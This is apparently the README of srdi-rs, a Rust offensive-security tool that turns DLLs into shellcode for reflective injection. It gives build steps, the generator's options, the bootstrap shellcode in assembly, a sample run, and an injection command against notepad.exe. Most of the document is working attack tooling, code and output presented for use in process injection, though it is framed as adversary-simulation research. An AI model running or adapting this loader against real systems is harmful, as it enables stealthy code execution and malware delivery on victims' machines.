# Shellcode Reflective DLL Injection (sRDI)

## Description

Shellcode reflective DLL injection (sRDI) is a process injection technique that allows us to convert a given DLL into a position-independent code which can then be injected using our favourite shellcode injection and execution technique.

## Usage

0). [Install Rust](https://www.rust-lang.org/tools/install)

1). Build all of the projects

```
cargo build --release
```

2). Generate the shellcode.

```
PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release> .\generate_shellcode.exe -h
Shellcode Reflective DLL Injection (sRDI)

Usage: generate_shellcode.exe [OPTIONS] --loader <LOADER> --payload <PAYLOAD> --function <FUNCTION> --parameter <PARAMETER> --output <OUTPUT>

Options:
      --loader <LOADER>        The reflective loader DLL path (loader.dll)
      --payload <PAYLOAD>      The payload DLL path (payload.dll)
      --function <FUNCTION>    The function to execute inside payload.dll (SayHello)
      --parameter <PARAMETER>  The parameter to pass to the function inside payload.dll (https://localhost:1337/)
      --output <OUTPUT>        The output file path (shellcode.bin)
      --flags <FLAGS>          The 0x0 flag will execute DllMain and any other flag will execute the function inside payload.dll (SayHello) [default: 1]
  -h, --help                   Print help
  -V, --version                Print version
PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release>
```

3). Bring your own injector (BYOI) and inject the position-independent code with your favourite injection and execution technique.

```
inject.exe <process> <shellcode.bin>
```

## Description

The bootstrap shellcode:

```asm
call 0x00
pop rcx
mov r8, rcx

push rsi
mov rsi, rsp
and rsp, 0x0FFFFFFFFFFFFFFF0
sub rsp, 0x30

mov qword ptr [rsp + 0x20], rcx
sub qword ptr [rsp + 0x20], 0x5
mov dword ptr [rsp + 0x28], <flags>

mov r9, <parameter_length>
add r8, <parameter_offset> + <payload_length>
mov edx, <parameter_hash>
add rcx, <payload_offset>

call <loader_offset>

nop
nop

mov rsp, rsi
pop rsi
ret

nop
nop
```

[![sRDI](./sRDI.png)](https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/)

**Credits: [Nick Landers @(monoxgas)](https://github.com/monoxgas)**

## Example

```
PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release> .\generate_shellcode.exe --loader .\reflective_loader.dll --payload .\payload.dll --function UserFunction --parameter https://127.0.0.1:1337/ --flags 0 --output shellcode.bin
Loader Path: .\reflective_loader.dll
Payload Path: .\payload.dll
Output Path: shellcode.bin
[+] Reflective Loader Offset: 0x400
[!] Bootstrap Shellcode Length: 79 (Ensure this matches BOOTSTRAP_TOTAL_LENGTH in the code)
[+] Reflective Loader Length: 3584
[+] Payload DLL Length: 113664
[+] Total Shellcode Length: 117350
[*] loader(payload_dll: *mut c_void, function_hash: u32, user_data: *mut c_void, user_data_len: u32, _shellcode_bin: *mut c_void, _flags: u32)
[*] arg1: rcx, arg2: rdx, arg3: r8, arg4: r9, arg5: [rsp + 0x20], arg6: [rsp + 0x28]
PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release>
```

```
.\inject.exe --process notepad.exe --file .\shellcode.bin
```

## References and Credits

* https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/
* https://github.com/monoxgas/sRDI
* https://github.com/stephenfewer/ReflectiveDLLInjection/
* https://discord.com/invite/rust-lang-community (Rust Community #windows-dev channel)
* https://github.com/dismantl/ImprovedReflectiveDLLInjection
* https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html
* https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/
* https://github.com/Cracked5pider/KaynLdr
* https://github.com/Ben-Lichtman/reloader/
* https://github.com/not-matthias/mmap/
* https://github.com/memN0ps/mmapper-rs
* https://github.com/2vg/blackcat-rs/tree/master/crate/mini-sRDI
* https://github.com/Jaxii/idk-rs/
* https://github.com/janoglezcampos/rust_syscalls/